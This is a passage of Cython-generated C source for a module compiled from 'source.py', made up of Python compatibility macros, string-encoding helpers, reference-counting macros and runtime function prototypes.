  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/
struct __pyx_obj_6source___pyx_scope_struct__genexpr;
struct __pyx_obj_6source___pyx_scope_struct_1_genexpr;
struct __pyx_obj_6source___pyx_scope_struct_2_genexpr;
struct __pyx_obj_6source___pyx_scope_struct_3_genexpr;


struct __pyx_obj_6source___pyx_scope_struct__genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_2_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_3_genexpr {
  PyObject_HEAD
  long __pyx_v__;
};


/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* ListCompAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
